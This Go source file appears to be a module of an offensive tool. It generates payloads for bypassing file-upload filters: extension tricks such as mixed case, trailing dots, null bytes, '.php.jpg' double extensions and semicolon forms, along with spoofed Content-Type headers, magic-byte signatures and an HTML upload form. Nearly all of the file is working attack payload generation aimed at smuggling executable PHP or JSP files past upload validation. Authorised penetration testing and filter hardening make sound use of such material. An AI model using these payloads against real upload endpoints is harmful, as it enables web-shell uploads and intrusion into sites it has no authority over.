package upload

import (
	"fmt"
	"strings"
	"sync"
	"time"
)

type Engine struct {
	config UploadConfig
	mu     sync.Mutex
}

func NewEngine(cfg UploadConfig) *Engine {
	return &Engine{
		config: cfg,
	}
}

func (e *Engine) ExtensionBypass(filename string) (*UploadResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	bypasses := e.generateExtensionBypasses(filename)

	return &UploadResult{
		Success:  true,
		Method:   "Extension_Bypass",
		Message:  fmt.Sprintf("Generated %d extension bypass payloads for %s", len(bypasses), filename),
		Duration: time.Since(start),
		Payload:  e.formatBypasses(bypasses),
		Risk:     "high",
	}, nil
}

func (e *Engine) generateExtensionBypasses(filename string) []ExtensionBypass {
	parts := strings.SplitN(filename, ".", 2)
	name := parts[0]
	ext := ""
	if len(parts) > 1 {
		ext = parts[1]
	}

	bypasses := make([]ExtensionBypass, 0)

	bypasses = append(bypasses, ExtensionBypass{
		Original: filename,
		Bypass:   name + "." + strings.ToUpper(ext),
		Technique: "case_change",
		CaseChange: true,
	})

	bypasses = append(bypasses, ExtensionBypass{
		Original: filename,
		Bypass:   name + "." + ext + ".",
		Technique: "trailing_dot",
	})

	bypasses = append(bypasses, ExtensionBypass{
		Original: filename,
		Bypass:   name + "." + ext + "%20",
		Technique: "trailing_space",
	})

	bypasses = append(bypasses, ExtensionBypass{
		Original: filename,
		Bypass:   name + "." + ext + "%00",
		Technique: "null_byte",
	})

	bypasses = append(bypasses, ExtensionBypass{
		Original: filename,
		Bypass:   name + ".php.jpg",
		Technique: "double_extension",
	})

	bypasses = append(bypasses, ExtensionBypass{
		Original: filename,
		Bypass:   name + ".pHp",
		Technique: "mixed_case",
		CaseChange: true,
	})

	bypasses = append(bypasses, ExtensionBypass{
		Original: filename,
		Bypass:   name + ".php5",
		Technique: "alternative_ext",
	})

	bypasses = append(bypasses, ExtensionBypass{
		Original: filename,
		Bypass:   name + ".php;.jpg",
		Technique: "semicolon",
	})

	bypasses = append(bypasses, ExtensionBypass{
		Original: filename,
		Bypass:   name + ".php%00.jpg",
		Technique: "null_byte_middle",
	})

	return bypasses
}

func (e *Engine) formatBypasses(bypasses []ExtensionBypass) string {
	var result strings.Builder
	for i, b := range bypasses {
		result.WriteString(fmt.Sprintf("[%d] %s -> %s (%s)\n", i+1, b.Original, b.Bypass, b.Technique))
	}
	return result.String()
}

func (e *Engine) ContentTypeBypass(filename string, contentType string) (*UploadResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	fakeTypes := e.generateContentTypeBypasses(contentType)

	return &UploadResult{
		Success:  true,
		Method:   "Content_Type_Bypass",
		Message:  fmt.Sprintf("Generated %d content-type bypasses for %s", len(fakeTypes), filename),
		Duration: time.Since(start),
		Payload:  e.formatContentTypes(fakeTypes),
		Risk:     "high",
	}, nil
}

func (e *Engine) generateContentTypeBypasses(original string) []ContentTypeBypass {
	bypasses := make([]ContentTypeBypass, 0)

	bypasses = append(bypasses, ContentTypeBypass{
		Original: original,
		FakeType: "image/jpeg",
		Header:   "Content-Type: image/jpeg",
	})

	bypasses = append(bypasses, ContentTypeBypass{
		Original: original,
		FakeType: "image/png",
		Header:   "Content-Type: image/png",
	})

	bypasses = append(bypasses, ContentTypeBypass{
		Original: original,
		FakeType: "application/octet-stream",
		Header:   "Content-Type: application/octet-stream",
	})

	bypasses = append(bypasses, ContentTypeBypass{
		Original: original,
		FakeType: "text/plain",
		Header:   "Content-Type: text/plain",
	})

	if original != "multipart/form-data" {
		bypasses = append(bypasses, ContentTypeBypass{
			Original: original,
			FakeType: "",
			Header:   "",
		})
	}

	return bypasses
}

func (e *Engine) formatContentTypes(bypasses []ContentTypeBypass) string {
	var result strings.Builder
	for i, b := range bypasses {
		result.WriteString(fmt.Sprintf("[%d] %s -> %s\n", i+1, b.Original, b.FakeType))
	}
	return result.String()
}

func (e *Engine) MagicBytesBypass(fileType string) (*UploadResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	signatures := e.getMagicSignatures(fileType)

	return &UploadResult{
		Success:  true,
		Method:   "Magic_Bytes_Bypass",
		Message:  fmt.Sprintf("Magic bytes for %s: %s", fileType, signatures),
		Duration: time.Since(start),
		Payload:  signatures,
		Risk:     "high",
	}, nil
}

func (e *Engine) getMagicSignatures(fileType string) string {
	magicMap := map[string]string{
		"php":  "PHP: 3C 3F 70 68 70 (< ? p h p)",
		"jsp":  "JSP: 3C 25 (< %)",
		"asp":  "ASP: 3C 25 (< %)",
		"html": "HTML: 3C 21 44 4F 43 54 59 50 45 (< ! D O C T Y P E)",
		"pdf":  "PDF: 25 50 44 46 (% P D F)",
		"png":  "PNG: 89 50 4E 47 0D 0A 1A 0A",
		"jpg":  "JPG: FF D8 FF",
		"gif":  "GIF: 47 49 46 38 (G I F 8)",
	}

	if sig, ok := magicMap[fileType]; ok {
		return sig
	}
	return "Unknown file type: " + fileType
}

func (e *Engine) DoubleExtension(filename string) (*UploadResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	payloads := e.generateDoubleExtensions(filename)

	return &UploadResult{
		Success:  true,
		Method:   "Double_Extension",
		Message:  fmt.Sprintf("Generated %d double extension payloads", len(payloads)),
		Duration: time.Since(start),
		Payload:  strings.Join(payloads, "\n"),
		Risk:     "high",
	}, nil
}

func (e *Engine) generateDoubleExtensions(filename string) []string {
	parts := strings.SplitN(filename, ".", 2)
	name := parts[0]

	payloads := []string{
		name + ".php.jpg",
		name + ".php.png",
		name + ".php%00.jpg",
		name + ".php;.jpg",
		name + ".php/.jpg",
		name + ".phtml.jpg",
		name + ".php5.jpg",
		name + ".php.jpg.png",
		name + ".jpg.php",
		name + ".png.php",
	}

	return payloads
}

func (e *Engine) NullByteInject(filename string) (*UploadResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	payloads := e.generateNullBytePayloads(filename)

	return &UploadResult{
		Success:  true,
		Method:   "Null_Byte_Inject",
		Message:  fmt.Sprintf("Generated %d null byte injection payloads", len(payloads)),
		Duration: time.Since(start),
		Payload:  strings.Join(payloads, "\n"),
		Risk:     "high",
	}, nil
}

func (e *Engine) generateNullBytePayloads(filename string) []string {
	payloads := []string{
		filename + "%00",
		filename + "%00.jpg",
		filename + "%00.png",
		filename + "\x00.jpg",
		filename + "\x00.png",
		filename + "%00.html",
		filename + "%00.php",
	}

	return payloads
}

func (e *Engine) AnalyzeUpload(filename string, contentType string, size int64) UploadAnalysis {
	ext := ""
	if idx := strings.LastIndex(filename, "."); idx >= 0 {
		ext = strings.ToLower(filename[idx+1:])
	}

	executableExts := map[string]bool{
		"php": true, "php3": true, "php4": true, "php5": true, "phtml": true,
		"jsp": true, "jspx": true, "asp": true, "aspx": true, "cer": true,
		"cgi": true, "pl": true, "py": true, "rb": true, "sh": true,
	}

	riskLevel := "low"
	if executableExts[ext] {
		riskLevel = "critical"
	} else if ext == "html" || ext == "svg" || ext == "xml" {
		riskLevel = "high"
	} else if ext == "js" || ext == "json" {
		riskLevel = "medium"
	}

	return UploadAnalysis{
		OriginalName: filename,
		FinalName:    filename,
		MIMEType:     contentType,
		IsExecutable: executableExts[ext],
		RiskLevel:    riskLevel,
	}
}

func (e *Engine) GenerateUploadHTML(targetURL string, fieldName string) string {
	return fmt.Sprintf(`<form method="POST" action="%s" enctype="multipart/form-data">
  <input type="file" name="%s" />
  <input type="submit" value="Upload" />
</form>`, targetURL, fieldName)
}
